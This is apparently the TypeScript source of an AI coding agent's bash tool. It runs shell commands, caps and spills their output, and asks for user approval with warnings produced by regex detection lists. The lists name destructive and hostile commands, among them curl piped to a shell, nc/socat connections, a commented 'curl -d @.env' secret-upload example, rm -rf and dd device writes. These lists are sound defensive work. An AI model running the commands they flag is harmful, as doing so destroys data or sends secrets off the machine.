import { spawn } from 'node:child_process';
import type { Tool, ToolResult } from '../types.js';
import { buildCappedFooter, buildSpillFooter, spillEnabled, spillResult } from './_spill.js';
import { recordCapped } from './_spillstats.js';

const DEFAULT_TIMEOUT_MS = 300_000;
const MAX_PAYLOAD_BYTES = 64 * 1024;
const OUTPUT_TAIL_BYTES = 2 * 1024;
const OUTPUT_TAIL_LINES = 10;
// Retained for the UI chip's last-lines view. Larger than OUTPUT_TAIL_BYTES so the slice to 10
// lines always has enough to work with even when lines are long, and small enough to be free.
const UI_TAIL_BYTES = 4 * 1024;
// How much output the spill buffer retains. Big enough that an ordinary build or test run spills
// complete; small enough that a runaway `yes` can't grow the process without bound. Only the
// retained window is held — the drain itself never stops, which is the whole point.
const SPILL_MAX_BYTES = 4 * 1024 * 1024;

export const bashTool: Tool = {
  name: 'bash',
  description:
    'Execute a shell command in the working directory. Prefer the dedicated tools (read, grep, edit, write, list) when they fit; use bash for build, test, lint, git/gh, and similar workflows.',
  parameters: {
    type: 'object',
    properties: {
      command: {
        type: 'string',
        description: 'Shell command to execute. Single string, run via /bin/sh.',
      },
    },
    required: ['command'],
  },
  async run(args, ctx) {
    const command = String(args.command ?? '').trim();
    if (!command) return { summary: 'Bash failed: empty command' };

    if (ctx.requestApproval) {
      const warnings = detectDangerousPatterns(command);
      const ok = await ctx.requestApproval({
        tool: 'bash',
        subject: ctx.cwd,
        preview: command,
        warnings: warnings.length > 0 ? warnings : undefined,
      });
      if (!ok) return { summary: `Bash declined by user: ${command}` };
    }

    return execStream(command, ctx, ctx.bashTimeoutMs);
  },
};

// A bounded tail of a stream: push every chunk, retain roughly the last `max` bytes. This is what
// lets bash spill without restructuring the drain — the process keeps writing at full speed and
// only the retained window is capped, so the end of a long run survives instead of the start.
//
// Chunk-granular, not byte-exact: whole chunks are dropped off the front, and the window is only
// trimmed while it would still hold `max` bytes without the front one. So it retains between `max`
// and `max` + one chunk (~64KB against a 4MB budget, under 2% slop) and never drops the only chunk
// it has. Slicing strings on every read would buy exactness nobody can use — the boundary is
// arbitrary either way, since a chunk edge is not a line edge.
export class TailWindow {
  private chunks: string[] = [];
  bytes = 0;

  constructor(private readonly max: number) {}

  push(text: string): void {
    this.chunks.push(text);
    this.bytes += text.length;
    while (this.chunks.length > 1 && this.bytes - this.chunks[0].length >= this.max) {
      this.bytes -= this.chunks.shift()!.length;
    }
  }

  text(): string {
    return this.chunks.join('');
  }
}

export function execStream(
  command: string,
  ctx: { cwd: string; onProgress?: (chunk: string) => void },
  timeoutMs: number = DEFAULT_TIMEOUT_MS,
): Promise<ToolResult> {
  return new Promise(resolve => {
    const proc = spawn('/bin/sh', ['-c', command], { cwd: ctx.cwd });
    const buffer: string[] = [];
    let totalBytes = 0;
    let timedOut = false;
    // Read once at spawn, not per chunk: a flag flipped mid-run would otherwise spill half a
    // command's output and describe it as the whole tail.
    const spilling = spillEnabled();
    // The spill window, kept alongside the payload buffer rather than instead of it. The payload
    // still keeps the HEAD (unchanged, so the flag A/Bs cleanly); this keeps the TAIL, because the
    // case that motivates spilling bash at all — a long test or build run — puts the failure at the
    // end, which is exactly what head-truncation throws away.
    const tail = new TailWindow(SPILL_MAX_BYTES);
    // A second, tiny window for the UI chip, always on and independent of REIKA_SPILL. The chip
    // shows the END of a run (see buildCommandDisplay), and a user watching a build deserves that
    // whether or not the model's artifact was written.
    const uiTail = new TailWindow(UI_TAIL_BYTES);
    // Every byte the process wrote, retained or not. `totalBytes` stops at the payload cap, so it
    // can't answer "of how many?" once truncation kicks in.
    let rawBytes = 0;

    const append = (chunk: Buffer): void => {
      const text = chunk.toString('utf8');
      ctx.onProgress?.(text);
      rawBytes += text.length;
      uiTail.push(text);
      if (spilling) tail.push(text);
      if (totalBytes >= MAX_PAYLOAD_BYTES) return;
      const remaining = MAX_PAYLOAD_BYTES - totalBytes;
      const slice = text.length > remaining ? text.slice(0, remaining) : text;
      buffer.push(slice);
      totalBytes += slice.length;
    };

    proc.stdout.on('data', append);
    proc.stderr.on('data', append);

    const timeoutId = setTimeout(() => {
      timedOut = true;
      proc.kill('SIGTERM');
    }, timeoutMs);

    proc.on('close', (code, signal) => {
      clearTimeout(timeoutId);
      const rawOutput = buffer.join('');
      const truncated = totalBytes >= MAX_PAYLOAD_BYTES ? '\n…(truncated)' : '';
      const base = (rawOutput + truncated || '(no output)') + searchHint(command, rawOutput);
      // Built from the retained tail, not the payload head: the chip is the user's answer to "how
      // did it end?", which the head cannot give once a run passes the cap.
      const display = buildCommandDisplay(command, uiTail.text(), rawBytes > uiTail.bytes);
      // The real size, unconditionally. `totalBytes` stops counting at the payload cap, so with
      // spill off the summary told the model a 234KB run "produced 65536 bytes" — a claim about
      // the command's output, not about how much of it we kept, and false either way. This was
      // gated on `spilling` to keep the flag a byte-identical A/B; the payload still is, and a
      // wrong number in the model's context is not worth the tidiness of that claim.
      const reported = rawBytes;
      const done = (payload: string): void => {
        if (timedOut) {
          resolve({
            summary: `Bash timeout: ${command} (killed after ${timeoutMs / 1000}s)`,
            payload,
            command: display,
            exitCode: code,
          });
        } else {
          // The status is *surfaced*, not reclassified (#200). A non-zero exit used to read
          // `Bash failed:`, which is wrong for the many commands that exit non-zero as ordinary
          // control flow — grep with no match, diff with differences, git diff --quiet, a test
          // runner reporting red. Calling those failures teaches the model to retry a command that
          // did exactly what it was asked. It still must not read as success either, which is what
          // the old code did before the exit check existed: an added `(exit 1, …)` slot says what
          // happened without judging it. A timeout and a spawn error keep their `Bash` prefixes —
          // there the command genuinely did not run to completion.
          const status = code === 0 ? '' : signal ? `killed by ${signal}, ` : `exit ${code}, `;
          resolve({
            summary: `Ran: ${command} (${status}${reported} bytes output)`,
            payload,
            command: display,
            exitCode: code,
          });
        }
      };
      // Recorded whether or not spilling is on: the question this answers is how often bash
      // output exceeds the cap at all, which is a property of the workload, not of the flag.
      if (rawBytes > MAX_PAYLOAD_BYTES) {
        recordCapped({
          tool: 'bash',
          total: rawBytes,
          shown: totalBytes,
          spilled: spilling,
          // Whether the 4MB window held the whole run. A stream of `complete: false` lines is the
          // evidence that SPILL_MAX_BYTES is too small; none of them means it is generous.
          complete: spilling ? tail.bytes >= rawBytes : undefined,
        });
      }
      // Nothing was held back (or spilling is off): the ordinary result, byte-identical to the
      // pre-spill behavior so the flag is a clean A/B — including staying synchronous.
      if (!spilling || rawBytes <= MAX_PAYLOAD_BYTES) {
        done(base);
        return;
      }
      void (async () => {
        const complete = tail.bytes >= rawBytes;
        const ref = await spillResult('bash', tail.text());
        const shared = { shown: totalBytes, total: String(rawBytes), unit: 'bytes' };
        done(
          base +
            (ref
              ? buildSpillFooter({
                  ...shared,
                  ref,
                  subject: 'command',
                  saved: complete
                    ? 'Full output'
                    : `The last ${tail.bytes} bytes (the middle was dropped)`,
                  note: complete
                    ? undefined
                    : 'The output above is the start of the run; the file holds the end.',
                })
              : buildCappedFooter({
                  ...shared,
                  advice: 'narrow the output (pipe through `tail` or `grep`) and run it again',
                })),
        );
      })();
    });

    proc.on('error', err => {
      clearTimeout(timeoutId);
      resolve({
        summary: `Bash failed: ${command} (${err.message})`,
        payload: buffer.join('') || err.message,
        command: buildCommandDisplay(command, buffer.join('') || err.message, false),
      });
    });
  });
}

// A bare line-search (grep/rg/etc.) returns only matching lines, never the surrounding
// code. Weak models tend to re-run the search with new flags instead of opening the file.
// When the output carries line numbers, append a one-line nudge to read those locations.
// Fires only when line numbers are present (so there's somewhere concrete to point), and is
// harmless if shown — it's a hint, not a command result.
const SEARCH_CMD_RE = /\b(?:e?grep|fgrep|rg|ag|ack)\b/;
const LINE_PREFIXED_RE = /^(?:[^\n:]*:)?\d+[:-]/m;

function searchHint(command: string, output: string): string {
  if (!SEARCH_CMD_RE.test(command) || !LINE_PREFIXED_RE.test(output)) return '';
  return (
    '\n\n(reika: these are matching lines only, not the full file. Use the read tool at the ' +
    'listed line numbers to see the surrounding code instead of re-running the search.)'
  );
}

// The chip under a command in the TUI: its last few lines, and whether anything came before them.
//
// `retained` must be the END of the run, not the head the payload keeps. It used to be fed the
// capped payload, so a truncated command showed the last 10 lines of the first 64KB — content from
// the MIDDLE of the run, presented where a reader looks for how it ended. Nothing about that was
// false (the marker did say more was omitted), but on `npm test` it meant showing test 4300 of
// 9000 instead of the failure. The end is what a human wants for the same reason the model does.
//
// `omittedEarlier` covers the bytes dropped before the retained window, which the window itself
// cannot see — without it a full 4KB window looks indistinguishable from a 4KB run.
function buildCommandDisplay(
  command: string,
  retained: string,
  omittedEarlier: boolean,
): { text: string; outputTail: string; outputTruncated: boolean } {
  if (!retained) return { text: command, outputTail: '', outputTruncated: false };
  const byteTail =
    retained.length > OUTPUT_TAIL_BYTES
      ? retained.slice(retained.length - OUTPUT_TAIL_BYTES)
      : retained;
  const lines = byteTail.split('\n');
  const lineTail = lines.slice(-OUTPUT_TAIL_LINES);
  const outputTruncated =
    omittedEarlier || retained.length > byteTail.length || lines.length > OUTPUT_TAIL_LINES;
  return { text: command, outputTail: lineTail.join('\n'), outputTruncated };
}

// Workflow-policy commands: not destructive (a commit is local and reversible, a push is
// recoverable), but they record or publish work, and the user generally wants to stay in the
// loop rather than have the agent do it autonomously. These funnel through the same warnings
// mechanism as the destructive patterns below — so under 'safe' auto-approve they force a
// prompt, and only explicit 'bypass' lets them run unattended. Kept as a separate constant
// from the genuinely-dangerous patterns so the safety/policy distinction stays visible.
const POLICY_PATTERNS: Array<{ re: RegExp; label: string }> = [
  { re: /\bgit\s+commit\b/, label: 'Git commit (records to version history)' },
  // Bare push; force push is also flagged separately below as a destructive pattern.
  { re: /\bgit\s+push\b/, label: 'Git push (publishes commits to remote)' },
  // Outward-facing GitHub/HF actions. Scoped to the publishing subcommands so read-only
  // invocations (gh pr view, gh run list, hf download) don't trip the gate — blanket gh/hf
  // matching would fire on reads and erode the signal. Remote *deletions* are destructive,
  // not policy, so they live in DANGER_PATTERNS below.
  { re: /\bgh\s+pr\s+(?:create|merge)\b/, label: 'GitHub PR create/merge (outward-facing)' },
  { re: /\bgh\s+release\s+create\b/, label: 'GitHub release create (publishes)' },
  { re: /\bhf\s+upload\b/, label: 'Hugging Face upload (publishes to hub)' },
  // Registry publishes. Same category and same irreversibility as `gh release create` above —
  // a published version is visible immediately and most registries refuse to reuse the version
  // number after an unpublish, so there is no quiet undo.
  {
    re: /\b(?:npm|pnpm|yarn|bun)\s+publish(?![\w./-])/,
    label: 'Package publish (npm/pnpm/yarn/bun)',
  },
  { re: /\bcargo\s+publish(?![\w./-])/, label: 'Package publish (cargo)' },
  { re: /\bpoetry\s+publish(?![\w./-])/, label: 'Package publish (poetry)' },
  { re: /\btwine\s+upload(?![\w./-])/, label: 'Package publish (twine)' },
  { re: /\bgem\s+push(?![\w./-])/, label: 'Package publish (gem push)' },
  { re: /\bmvn\s+deploy(?![\w./-])/, label: 'Package publish (mvn deploy)' },
  { re: /\bgradlew?\s+publish(?![\w./-])/, label: 'Package publish (gradle)' },
  {
    re: /\b(?:docker|podman)\s+push(?![\w./-])/,
    label: 'Container image push (publishes to registry)',
  },
];

// Package management at ANY scope: installs, uninstalls, and registry-fetch-and-run (npx and
// friends). Every ecosystem runs install-time scripts, so an install is arbitrary code execution
// chosen by the model, and the package it picks may be hallucinated, typosquatted, or outright
// malicious. Deliberately not limited to commands that name a package: a bare `npm install`
// builds from a manifest the model may have just edited, and a lockfile install still runs
// lifecycle scripts. The global-install patterns stay separate because those also change state
// outside the project — a global install trips both and reads as both.
// The trailing (?![\w./-]) keeps the verb a whole token, so `npm run install-hooks` and
// `cat install.md` don't read as installs.
const PACKAGE_PATTERNS: Array<{ re: RegExp; label: string }> = [
  {
    re: /\b(?:npm|pnpm|bun)\s+(?:-{1,2}[\w-]+\s+)*(?:install|i|add|ci)(?![\w./-])/,
    label: 'Package install (npm/pnpm/bun)',
  },
  {
    re: /\byarn\s+(?:-{1,2}[\w-]+\s+)*(?:install|add)(?![\w./-])/,
    label: 'Package install (yarn)',
  },
  {
    re: /\b(?:pip|pip3)\s+(?:-{1,2}[\w-]+\s+)*install(?![\w./-])/,
    label: 'Python package install (pip)',
  },
  {
    re: /\bpython[\d.]*\s+-m\s+pip\s+(?:-{1,2}[\w-]+\s+)*install(?![\w./-])/,
    label: 'Python package install (pip)',
  },
  {
    re: /\buv\s+(?:pip\s+install|add|sync)(?![\w./-])/,
    label: 'Python package install (uv)',
  },
  {
    re: /\b(?:poetry|pipenv)\s+(?:install|add)(?![\w./-])/,
    label: 'Python package install (poetry/pipenv)',
  },
  { re: /\bcargo\s+add\b/, label: 'Rust package install (cargo add)' },
  { re: /\bgo\s+get\b/, label: 'Go module install (go get)' },
  {
    re: /\b(?:bundle|composer)\s+(?:install|add|require)(?![\w./-])/,
    label: 'Package install (bundler/composer)',
  },
  {
    re: /\b(?:apt|apt-get|dnf|yum|zypper|apk|choco|scoop|winget|port)\s+(?:-{1,2}[\w-]+\s+)*(?:install|add)(?![\w./-])/,
    label: 'System package install (persistent system change)',
  },
  { re: /\bpacman\s+-S[yu]*\b/, label: 'System package install (persistent system change)' },

  // Uninstalls — the mirror of an install, and just as much the user's call: the model can rip
  // out a dependency the project still needs, remove-hooks run the same arbitrary code, and the
  // system-level ones reach outside the repo entirely.
  {
    re: /\b(?:npm|pnpm|bun|yarn)\s+(?:-{1,2}[\w-]+\s+)*(?:uninstall|remove|rm|un)(?![\w./-])/,
    label: 'Package uninstall (npm/pnpm/yarn/bun)',
  },
  {
    re: /\b(?:pip|pip3)\s+(?:-{1,2}[\w-]+\s+)*uninstall(?![\w./-])/,
    label: 'Python package uninstall (pip)',
  },
  {
    re: /\bpython[\d.]*\s+-m\s+pip\s+(?:-{1,2}[\w-]+\s+)*uninstall(?![\w./-])/,
    label: 'Python package uninstall (pip)',
  },
  {
    re: /\b(?:uv|poetry|pipenv)\s+(?:tool\s+)?(?:remove|uninstall)(?![\w./-])/,
    label: 'Python package uninstall (uv/poetry/pipenv)',
  },
  {
    re: /\b(?:brew|pipx|cargo|gem|composer|bundle|go)\s+(?:uninstall|remove)(?![\w./-])/,
    label: 'Package uninstall (global tool)',
  },
  {
    re: /\b(?:apt|apt-get|dnf|yum|zypper|apk|choco|scoop|winget|port)\s+(?:-{1,2}[\w-]+\s+)*(?:uninstall|remove|purge|del)(?![\w./-])/,
    label: 'System package uninstall (persistent system change)',
  },
  { re: /\bpacman\s+-R[a-z]*\b/, label: 'System package uninstall (persistent system change)' },

  // Fetch-and-run: no install, same vector. `npx some-cli` downloads a package the model chose
  // — hallucinated or typosquatted just as easily as one it would have installed — and executes
  // it immediately, so it gets the same gate.
  {
    re: /\b(?:npx|bunx|uvx)(?![\w./-])/,
    label: 'Remote package execution (npx/bunx/uvx)',
  },
  {
    re: /\b(?:pnpm|yarn)\s+dlx(?![\w./-])|\bpipx\s+run(?![\w./-])/,
    label: 'Remote package execution (dlx/pipx run)',
  },
];

// Fallback for the package managers not worth enumerating (conda, mix, gcloud components, a
// project's own `make install`): any command whose verb is `install` or `uninstall`. A couple of
// leading tokens are allowed so wrappers still match (`sudo apt install`, `python -m pip
// install`), and it is only reported when no specific package pattern fired — see
// detectDangerousPatterns. Matching is per shell segment, because the verb position is what
// makes this precise: `grep -rn install src/` passes `install` as an *argument*, and the
// read-only leads below never install anything, so they are skipped outright.
const GENERIC_PACKAGE_RE = /^(?:\S+\s+){1,3}?(?:-{1,2}[\w-]+\s+)*(un)?install(?![\w./-])/;
const READ_ONLY_LEAD_RE =
  /^(?:e?grep|fgrep|rg|ag|ack|find|man|which|type|whereis|cat|bat|less|more|head|tail|awk|sed|echo|printf|ls|wc|git)\b/;

// Tools whose own patterns already describe what they do. Without this, `helm uninstall app`
// falls through to the generic label and reads as "removes third-party code" — it removes a
// release from a cluster, and a misleading label is its own bug: the warning text is what the
// user reads to decide.
const SELF_COVERED_LEAD_RE = /^(?:helm|kubectl|oc|docker|podman|terraform|tofu|pulumi)\b/;

function genericPackageLabel(command: string): string | undefined {
  for (const segment of command.split(/[;&|]+/)) {
    const seg = segment.trim();
    if (!seg || READ_ONLY_LEAD_RE.test(seg) || SELF_COVERED_LEAD_RE.test(seg)) continue;
    const m = GENERIC_PACKAGE_RE.exec(seg);
    if (m) {
      return m[1]
        ? 'Uninstall command (removes third-party code)'
        : 'Install command (fetches and runs third-party code)';
    }
  }
  return undefined;
}

// Cluster and container CLIs get the OPPOSITE polarity from the install patterns above, and the
// reason is the risk asymmetry. Read verbs are a small closed set; mutating verbs are a long open
// tail that grows every release. Blocklist the tail and a verb nobody enumerated runs silently —
// fails open, high cost. Allowlist the reads and a *new read verb* prompts once — fails safe,
// ~zero cost. Same file, two correct polarities.
//
// The read sets are generous on purpose. The precision argument cuts hardest here: in a
// container-heavy repo, prompting on `docker ps` trains reflexive approval, and that degrades the
// gate for `rm -rf` too. Two-token entries exist because the noun-first forms (`docker image ls`,
// `kubectl config view`) are reads while their siblings (`image rm`, `config set-context`) are not.
const CLUSTER_READ_VERBS: Record<string, readonly string[]> = {
  kubectl: [
    'get',
    'describe',
    'logs',
    'top',
    'explain',
    'version',
    'cluster-info',
    'api-resources',
    'api-versions',
    'diff',
    'events',
    'completion',
    'help',
    'config view',
    'config get-contexts',
    'config current-context',
    'auth can-i',
  ],
  docker: [
    'ps',
    'images',
    'logs',
    'inspect',
    'version',
    'info',
    'stats',
    'port',
    'diff',
    'history',
    'search',
    'help',
    'events',
    'top',
    'image ls',
    'image inspect',
    'image history',
    'container ls',
    'container inspect',
    'container logs',
    'volume ls',
    'volume inspect',
    'network ls',
    'network inspect',
    'context ls',
    'system df',
    'system info',
    'compose ps',
    'compose logs',
    'compose config',
    'compose version',
    'buildx ls',
    'buildx version',
  ],
};
CLUSTER_READ_VERBS.oc = CLUSTER_READ_VERBS.kubectl;
CLUSTER_READ_VERBS.podman = CLUSTER_READ_VERBS.docker;

// Verbs that already carry a more specific label, so the generic mutation one stays quiet rather
// than stacking a second warning on the same command.
const CLUSTER_VERBS_COVERED_ELSEWHERE: Record<string, readonly string[]> = {
  docker: ['push'],
  podman: ['push'],
};

// Global flags that consume the token after them, so `kubectl -n prod get pods` reads as `get`
// rather than as `prod` — mistaking a namespace for a subcommand would prompt on every read.
const FLAG_TAKES_VALUE = new Set([
  '-n',
  '--namespace',
  '--context',
  '--kubeconfig',
  '-o',
  '--output',
  '-f',
  '--filename',
  '-l',
  '--selector',
  '--as',
  '--token',
  '-s',
  '--server',
  '--user',
  '--cluster',
  '-H',
  '--host',
  '--config',
  '--log-level',
  '--format',
  '--filter',
  '--since',
  '--tail',
  '-e',
  '--env',
  '-v',
  '--volume',
  '-p',
  '--publish',
  '--name',
  '--network',
  '-u',
  '-w',
  '--workdir',
  '--entrypoint',
  '--label',
  '--mount',
  '--platform',
  '--request-timeout',
]);

function clusterLabel(segment: string): string | undefined {
  const tokens = segment.split(/\s+/);
  const tool = tokens[0];
  const reads = CLUSTER_READ_VERBS[tool];
  if (!reads) return undefined;
  const sub: string[] = [];
  for (let i = 1; i < tokens.length && sub.length < 2; i++) {
    const t = tokens[i];
    if (t.startsWith('-')) {
      if (FLAG_TAKES_VALUE.has(t)) i++;
      continue;
    }
    sub.push(t);
  }
  const [verb, next] = sub;
  if (!verb) return undefined;
  if (reads.includes(verb)) return undefined;
  if (next && reads.includes(`${verb} ${next}`)) return undefined;
  if (CLUSTER_VERBS_COVERED_ELSEWHERE[tool]?.includes(verb)) return undefined;
  // `docker system` and `kubectl config` are noun groups, not verbs — naming only the first
  // token would tell the user less than the command already did.
  const group = next && reads.some(r => r.startsWith(`${verb} `));
  return `Cluster/container mutation (${tool} ${group ? `${verb} ${next}` : verb})`;
}

// Commands whose danger lives in the *verb* position, so they are matched per shell segment
// rather than anywhere in the string: both words are perfectly ordinary as arguments (`grep -rn
// curl src/`, `git log --grep pkill`), and blanket matching would fire on reads and erode the
// signal the same way a blanket `gh` match would. Matched after the leading wrappers below are
// stripped, so `sudo curl …` and `FOO=1 pkill …` still read as what they run.
const VERB_PATTERNS: Array<{ re: RegExp; label: string }> = [
  // Network egress: a request carries whatever the model chose to send off the machine (`curl -d
  // @.env`) and brings back content it then acts on. Piping that straight to a shell is worse and
  // stays flagged separately below; the fetch itself is still the user's call.
  { re: /^(?:curl|wget)(?![\w./-])/, label: 'Network request (curl/wget)' },
  // Kill-by-name matches on a pattern, not a PID, so the blast radius is every process whose name
  // happens to match — the user's editor, dev server, or database, not just the agent's own run.
  { re: /^(?:pkill|killall)(?![\w./-])/, label: 'Kill processes by name (pkill/killall)' },
  // Remote access: whatever the agent does on the far side is outside this gate, outside the
  // repo, and outside anything a local sandbox could constrain — so the hop itself is the only
  // place left to ask. Coverage has to be structural, not incidental on the argument text.
  { re: /^(?:ssh|scp|sftp)(?![\w./-])/, label: 'Remote host access (ssh/scp/sftp)' },
  {
    re: /^rsync(?![\w./-]).*\s(?:rsync:\/\/|[A-Za-z0-9_.@-]+:)/,
    label: 'Remote host access (rsync)',
  },
  // The one rsync form that destroys locally too: --delete empties the destination to match the
  // source, with no `rm` anywhere in the command for the other patterns to catch.
  {
    re: /^rsync(?![\w./-]).*\s--del(?:ete(?:-[\w-]+)?)?(?![\w-])/,
    label: 'Delete-on-sync (rsync --delete)',
  },
  // Ends the session and everything else the user is running; a flailing model does emit these.
  {
    re: /^(?:reboot|shutdown|halt|poweroff)(?![\w./-])/,
    label: 'Power state change (reboot/shutdown)',
  },
  // Overwrites the bytes before unlinking, so nothing survives — not the file, not a git object.
  { re: /^shred(?![\w./-])/, label: 'Unrecoverable file wipe (shred)' },

  // Tier 2 — infra tools whose mutating verbs are a small named set, so these keep the ordinary
  // blocklist polarity; only kubectl/docker above need the inverted one.
  {
    re: /^helm\s+(?:-{1,2}[\w-]+\s+)*(?:install|upgrade|uninstall|rollback|delete)(?![\w./-])/,
    label: 'Helm release change (modifies a cluster)',
  },
  {
    re: /^(?:terraform|tofu|pulumi)\s+(?:-{1,2}[\w-]+\s+)*(?:apply|destroy|import|taint|untaint)(?![\w./-])/,
    label: 'Infrastructure change (terraform/pulumi)',
  },
  {
    re: /^(?:terraform|tofu|pulumi)\s+state\s+(?:rm|mv|push|delete)(?![\w./-])/,
    label: 'Infrastructure change (terraform/pulumi)',
  },
  // Fans out to every host in the inventory at once, so the blast radius is the fleet.
  { re: /^ansible(?:-playbook)?(?![\w./-])/, label: 'Runs across many hosts (ansible)' },
  // Cloud CLIs nest their verbs (`aws s3 rm …`, `gcloud compute instances delete …`), so the verb
  // is matched a few tokens in rather than immediately after the tool — and heroku joins them
  // with a colon (`heroku ps:scale`) rather than a space.
  {
    re: /^(?:aws|gcloud|az|flyctl|fly|vercel|netlify|heroku|doctl)(?![\w./-])(?:\s+\S+){0,6}?[\s:](?:create|delete|update|deploy|set|put|remove|rm|scale|restart|destroy)(?![\w./-])/,
    label: 'Cloud resource change (mutating cloud CLI verb)',
  },

  // Tier 4 — persistent system state: survives the turn, the session, and usually the reboot.
  {
    re: /^(?:systemctl|service)(?![\w./-])[^\n]*\b(?:start|stop|restart|reload|enable|disable|mask|unmask)(?![\w./-])/,
    label: 'Service state change (systemctl/service)',
  },
  {
    re: /^launchctl\s+(?:load|unload|bootstrap|bootout|enable|disable|kickstart|remove|start|stop|setenv)(?![\w./-])/,
    label: 'Launch agent change (launchctl)',
  },
  {
    re: /^brew\s+services\s+(?:start|stop|restart|run|cleanup)(?![\w./-])/,
    label: 'Service state change (brew services)',
  },
  // `crontab -r` wipes every job with no confirmation and is one fat-finger from `crontab -e`.
  // `-l` is the only read, so it is the only form that stays quiet.
  { re: /^crontab(?![\w./-])(?![^\n]*\s-l\b)/, label: 'Scheduled job change (crontab)' },
  {
    re: /^defaults\s+(?:write|delete|import)(?![\w./-])/,
    label: 'macOS preference write (defaults)',
  },
  { re: /^(?:spctl|csrutil)(?![\w./-])/, label: 'Disabling macOS security (spctl/csrutil)' },
  {
    re: /^(?:diskutil|hdiutil)\s+(?:-{1,2}[\w-]+\s+)*(?:erase\w*|partitionDisk|reformat|apfs|destroy\w*)(?![\w./-])/i,
    label: 'Disk erase/partition (diskutil/hdiutil)',
  },
  {
    re: /^(?:mkfs(?:\.\w+)?|fdisk|parted|sgdisk)(?![\w./-])/,
    label: 'Filesystem/partition change (mkfs/fdisk/parted)',
  },
  // Bare `mount` just lists the table; requiring an argument keeps the read quiet.
  { re: /^u?mount(?![\w./-])\s+\S/, label: 'Mount table change (mount/umount)' },
  {
    re: /^tmutil\s+(?:delete|deletelocalsnapshots|disable)(?![\w./-])/,
    label: 'Time Machine backup change (tmutil)',
  },
  // Drives any GUI app on the machine — Mail, Finder, the browser — from one line.
  { re: /^osascript(?![\w./-])/, label: 'GUI automation (osascript)' },

  // The one command the gate cannot inspect: what runs is whatever the variable expands to at
  // execution time, so every pattern in this file is matching the wrapper rather than the work.
  { re: /^eval(?![\w./-])/, label: 'Executes an unreviewable string (eval)' },
  // Called out in #206 as low-frequency in ordinary dev and nearly free to add.
  { re: /^(?:nc|ncat|socat|telnet)(?![\w./-])/, label: 'Raw network connection (nc/socat/telnet)' },
  // Only the everything-target is worth flagging: a targeted `kill <pid>` is recoverable, and the
  // agent legitimately manages its own background processes.
  { re: /^kill\s+(?:-\w+\s+)*-1(?![\d\w./-])/, label: 'Kill every process (kill -1)' },
];

// Leading tokens that don't change what a segment actually runs: env assignments, privilege and
// timing wrappers, and the shell keywords a segment can open with (`if curl … ; then`).
const VERB_PREFIX_RE =
  /^(?:(?:[A-Za-z_]\w*=\S*|sudo|command|nohup|exec|env|time|if|then|else|elif|do|while|until|!)\s+)+/;

// Segments split on the operators AND on command substitution, so `$(curl …)` and `` `pkill …` ``
// are seen as the commands they are rather than as arguments of whatever encloses them.
function verbLabels(command: string): string[] {
  const hits: string[] = [];
  for (const segment of command.split(/[\n;&|(){}]+|\$\(|`/)) {
    const seg = segment.trim().replace(VERB_PREFIX_RE, '');
    if (!seg) continue;
    for (const { re, label } of VERB_PATTERNS) {
      if (re.test(seg) && !hits.includes(label)) hits.push(label);
    }
    const cluster = clusterLabel(seg);
    if (cluster && !hits.includes(cluster)) hits.push(cluster);
  }
  return hits;
}

const DANGER_PATTERNS: Array<{ re: RegExp; label: string }> = [
  {
    re: /\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\b/,
    label: 'Recursive force delete (rm -rf)',
  },
  // Recursive deletion is recursive deletion; -f only suppresses the prompts nothing was going
  // to show anyway. The lookahead keeps `rm -rf` on its own more specific label above, while
  // still catching the split-flag form (`rm -f -r x`) that pattern misses.
  {
    re: /\brm\s+(?:-{1,2}[\w-]+\s+)*(?:--recursive\b|-(?!\w*f)[a-zA-Z]*[rR])/,
    label: 'Recursive delete (rm -r)',
  },
  {
    re: /\bfind\b[^&;|]*\s(?:-delete\b|-exec\s+rm\b)/,
    label: 'Delete files by search (find -delete)',
  },
  {
    re: /\bchmod\s+(?:-{1,2}[\w-]+\s+)*(?:-[a-zA-Z]*R|--recursive\b)/,
    label: 'Recursive permission change (chmod -R)',
  },
  {
    re: /\bchown\s+(?:-{1,2}[\w-]+\s+)*(?:-[a-zA-Z]*R|--recursive\b)/,
    label: 'Recursive ownership change (chown -R)',
  },
  { re: /\bsudo\b/, label: 'Privilege escalation (sudo)' },
  { re: /(curl|wget)[^|]*\|\s*(sh|bash|zsh)\b/, label: 'Piping remote content to shell' },
  { re: /\|\s*(sh|bash|zsh)\b/, label: 'Piping to shell' },
  { re: /\bdd\s+[^&;|]*\bof=\/dev\//, label: 'Direct device write (dd of=/dev/…)' },
  // dd truncates and overwrites whatever `of=` names, device or not — the label differs only so
  // the user reads the right severity.
  { re: /\bdd\s+[^&;|]*\bof=(?!\/dev\/)/, label: 'Overwrite file with dd (dd of=…)' },
  {
    re: /\bgit\s+push[^&;|]*(--force\b|--force-with-lease\b|\s-f\b)/,
    label: 'Force push to remote',
  },
  { re: /\bgit\s+branch\s+-D\b/, label: 'Force-delete git branch' },
  { re: /\bgit\s+reset\s+--hard\b/, label: 'Hard reset (discards uncommitted changes)' },
  { re: /\bgit\s+clean\s+-[a-zA-Z]*f/, label: 'Force-clean untracked files' },
  // The same act as the hard reset above through a different verb, and the worst of the set:
  // uncommitted work was never in the object store, so there is no reflog to recover it from.
  // Matched only in the pathspec forms — `git checkout <branch>` and `git restore --staged`
  // keep the working tree, and prompting on a branch switch trains reflexive approval, which
  // costs more safety than these patterns buy.
  {
    re: /\bgit\s+checkout\b[^&;|]*\s--\s/,
    label: 'Discard working-tree changes (git checkout -- <path>)',
  },
  {
    re: /\bgit\s+checkout\s+(?:-{1,2}[\w-]+\s+)*\.(?:\s|$)/,
    label: 'Discard working-tree changes (git checkout -- <path>)',
  },
  {
    re: /\bgit\s+restore\b(?![^&;|]*(?:--staged\b|\s-S\b))/,
    label: 'Discard working-tree changes (git restore)',
  },
  {
    re: /\bgit\s+restore\b[^&;|]*(?:--worktree\b|\s-W\b)/,
    label: 'Discard working-tree changes (git restore)',
  },
  {
    re: /\bgit\s+stash\s+(?:drop|clear)\b/,
    label: 'Discard stashed changes (git stash drop/clear)',
  },
  // Recovery surfaces: expiring the reflog or pruning unreachable objects deletes exactly what
  // a bad reset would otherwise be recoverable from, so these turn a reversible mistake final.
  { re: /\bgit\s+reflog\s+expire\b/, label: 'Expire reflog (removes the undo history)' },
  {
    re: /\bgit\s+gc\b[^&;|]*--prune(?:=|\b)/,
    label: 'Prune unreachable git objects (git gc --prune)',
  },
  { re: /\bgit\s+filter-(?:branch|repo)\b/, label: 'Rewrite git history (filter-branch/repo)' },
  { re: /\bgit\s+update-ref\b[^&;|]*\s-d\b/, label: 'Delete a git ref (git update-ref -d)' },
